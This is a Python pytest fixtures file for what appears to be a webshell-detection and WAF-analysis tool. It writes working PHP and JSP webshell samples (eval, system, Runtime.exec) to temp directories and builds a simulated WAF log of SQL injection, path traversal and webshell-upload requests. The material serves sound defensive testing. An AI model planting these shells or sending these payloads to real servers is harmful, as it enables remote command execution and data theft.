# -*- coding: utf-8 -*-
"""
E2E Test Suite — shared fixtures

All tests use isolated temp directories. No running server required.
"""
import os
import sys
import tempfile
import shutil
from pathlib import Path

import pytest


@pytest.fixture(autouse=True)
def isolate_environment(monkeypatch):
    """Ensure tests don't touch real data directories.

    Sets ANTEUMBRA_TOOL_MODE=true and redirects data/ to a temp dir.
    """
    monkeypatch.setenv("ANTEUMBRA_TOOL_MODE", "true")
    monkeypatch.setenv("PYTEST_CURRENT_TEST", "true")
    # Prevent accidental imports from old Anteumbra installation
    monkeypatch.setenv("ANTEUMBRA_HOME", "")


@pytest.fixture
def temp_data_dir(tmp_path):
    """Create an isolated data directory structure.

    Returns a Path pointing to the temp data root.
    """
    data_dir = tmp_path / "data"
    data_dir.mkdir()
    (data_dir / "quarantine").mkdir()
    (data_dir / "threat_intel").mkdir()
    return data_dir


@pytest.fixture
def webshell_samples(tmp_path):
    """Create a directory of webshell samples for testing.

    Returns dict of {name: Path}.
    """
    sample_dir = tmp_path / "samples"
    sample_dir.mkdir()

    samples = {
        "simple_eval.php": """<?php @eval($_POST['pass']); ?>""",
        "base64_decode.php": """<?php
            $x = base64_decode($_GET['data']);
            @eval($x);
        ?>""",
        "system_cmd.php": """<?php system($_REQUEST['cmd']); ?>""",
        "preg_replace_malice.php": """<?php
            @preg_replace('/.*/e', $_POST['x'], '');
            echo "Shell via preg_replace";
        ?>""",
        "obfuscated_eval.php": """<?php
            $a = 'ev'; $b = 'al';
            $a .= $b;
            $a('$' . '_POST["pass"]');
        ?>""",
    }

    for name, content in samples.items():
        path = sample_dir / name
        path.write_text(content, encoding="utf-8")

    return sample_dir


@pytest.fixture
def variant_webshells(tmp_path):
    """Create webshell variants for file clustering tests.

    Group A (PHP eval family): 3 files with similar eval() patterns
    Group B (JSP family): 2 files with Java process execution
    """
    variant_dir = tmp_path / "variants"
    variant_dir.mkdir()

    # Group A: PHP eval-type shells (should cluster together)
    variants = {
        "eval_v1.php": """<?php
            // PHP eval webshell variant A — 90% identical to v2
            // Shared pattern: @eval with base64_decode
            error_reporting(0);
            session_start();
            $password = 'admin123';
            if (isset($_POST['cmd'])) {
                $code = base64_decode($_POST['cmd']);
                @eval($code);
                echo "Command executed successfully";
            }
            // Utility functions
            function get_server_info() {
                return array(
                    'os' => PHP_OS,
                    'version' => phpversion(),
                    'user' => get_current_user(),
                );
            }
            function list_directory($path) {
                $files = scandir($path);
                foreach ($files as $file) {
                    if ($file != '.' && $file != '..') {
                        echo $file . "\\n";
                    }
                }
            }
        ?>""",
        "eval_v2.php": """<?php
            // PHP eval webshell variant B — 90% identical to v1
            // Shared pattern: @eval with base64_decode
            error_reporting(0);
            session_start();
            $password = 'shell_pass';
            if (isset($_POST['shell'])) {
                $code = base64_decode($_POST['shell']);
                @eval($code);
                echo "Shell executed successfully";
            }
            // Utility functions
            function get_server_info() {
                return array(
                    'os' => PHP_OS,
                    'version' => phpversion(),
                    'user' => get_current_user(),
                );
            }
            function list_directory($path) {
                $files = scandir($path);
                foreach ($files as $file) {
                    if ($file != '.' && $file != '..') {
                        echo $file . "\\n";
                    }
                }
            }
        ?>""",
        "eval_v3.php": """<?php
            // PHP eval webshell variant C — still similar structure
            error_reporting(0);
            session_start();
            $pass = 'backdoor_key';
            $input = $_REQUEST['pass'];
            eval(base64_decode($input));
            echo "Done";
            // Utility functions
            function get_server_info() {
                return array(
                    'os' => PHP_OS,
                    'version' => phpversion(),
                    'user' => get_current_user(),
                );
            }
            function list_directory($path) {
                $files = scandir($path);
                foreach ($files as $file) {
                    if ($file != '.' && $file != '..') {
                        echo $file . "\\n";
                    }
                }
            }
        ?>""",
        # Group B: JSP shells (should cluster separately from PHP)
        "cmd_jsp1.jsp": """<%@page import="java.io.*,java.util.*"%>
            <%--
            JSP webshell variant A — command execution via Runtime.exec
            Shared pattern: Process execution with Runtime.getRuntime()
            --%>
            <%
            String cmd = request.getParameter("c");
            if (cmd != null) {
                Process p = Runtime.getRuntime().exec(cmd);
                BufferedReader r = new BufferedReader(
                    new InputStreamReader(p.getInputStream())
                );
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = r.readLine()) != null) {
                    sb.append(line).append("\\n");
                }
                r.close();
                p.waitFor();
                out.println("<pre>" + sb.toString() + "</pre>");
            }
            // Utility: show server info
            out.println("Server: " + application.getServerInfo());
            out.println("Java: " + System.getProperty("java.version"));
            %>
        """,
        "cmd_jsp2.jsp": """<%@page import="java.io.*,java.util.*"%>
            <%--
            JSP webshell variant B — command execution via ProcessBuilder
            Shared pattern: Process execution
            --%>
            <%
            String userCmd = request.getParameter("cmd");
            if (userCmd != null) {
                String[] cmds = {"/bin/sh", "-c", userCmd};
                ProcessBuilder pb = new ProcessBuilder(cmds);
                Process p = pb.start();
                Scanner s = new Scanner(p.getInputStream()).useDelimiter("\\\\A");
                String output = s.hasNext() ? s.next() : "";
                s.close();
                p.waitFor();
                out.println("<pre>" + output + "</pre>");
            }
            // Utility: show server info
            out.println("Server: " + application.getServerInfo());
            out.println("Java: " + System.getProperty("java.version"));
            %>
        """,
    }

    for name, content in variants.items():
        path = variant_dir / name
        path.write_text(content, encoding="utf-8")

    return variant_dir


@pytest.fixture
def waf_events_file(tmp_path):
    """Create a WAF events JSONL file with simulated attack traffic.

    Returns Path to the events file.
    """
    import json

    events_file = tmp_path / "waf_events.jsonl"
    events = [
        # Attacker 1: 10.99.99.1 — SQLMap scan
        {"timestamp": "2026-07-01T10:00:01", "src_ip": "10.99.99.1", "method": "GET",
         "url": "/products.php?id=1' OR '1'='1", "waf_score": 85, "user_agent": "sqlmap/1.6"},
        {"timestamp": "2026-07-01T10:00:05", "src_ip": "10.99.99.1", "method": "GET",
         "url": "/products.php?id=1 UNION SELECT NULL", "waf_score": 90, "user_agent": "sqlmap/1.6"},
        {"timestamp": "2026-07-01T10:00:10", "src_ip": "10.99.99.1", "method": "POST",
         "url": "/login.php", "waf_score": 70, "user_agent": "sqlmap/1.6",
         "body": "user=admin'--&pass=x"},
        {"timestamp": "2026-07-01T10:00:15", "src_ip": "10.99.99.1", "method": "GET",
         "url": "/admin/config.php?file=../../etc/passwd", "waf_score": 95, "user_agent": "sqlmap/1.6"},
        # Attacker 2: 10.88.77.2 — AntSword webshell upload
        {"timestamp": "2026-07-01T10:01:00", "src_ip": "10.88.77.2", "method": "POST",
         "url": "/upload.php", "waf_score": 80, "user_agent": "AntSword/v2.1",
         "body": "<?php @eval($_POST['ant']); ?>"},
        {"timestamp": "2026-07-01T10:01:05", "src_ip": "10.88.77.2", "method": "POST",
         "url": "/images/shell.php", "waf_score": 95, "user_agent": "AntSword/v2.1",
         "body": "ant=system('ls -la');"},
        {"timestamp": "2026-07-01T10:01:10", "src_ip": "10.88.77.2", "method": "POST",
         "url": "/images/shell.php", "waf_score": 90, "user_agent": "AntSword/v2.1",
         "body": "ant=system('cat /etc/passwd');"},
        # Attacker 3: 10.66.55.4 — BurpSuite probing
        {"timestamp": "2026-07-01T10:02:00", "src_ip": "10.66.55.4", "method": "GET",
         "url": "/.env", "waf_score": 60, "user_agent": "Mozilla/5.0"},
        {"timestamp": "2026-07-01T10:02:05", "src_ip": "10.66.55.4", "method": "GET",
         "url": "/.git/config", "waf_score": 65, "user_agent": "Mozilla/5.0"},
        {"timestamp": "2026-07-01T10:02:10", "src_ip": "10.66.55.4", "method": "GET",
         "url": "/wp-admin/install.php", "waf_score": 50, "user_agent": "Mozilla/5.0"},
    ]

    with open(str(events_file), 'w', encoding='utf-8') as f:
        for evt in events:
            f.write(json.dumps(evt, ensure_ascii=False) + '\n')

    return events_file
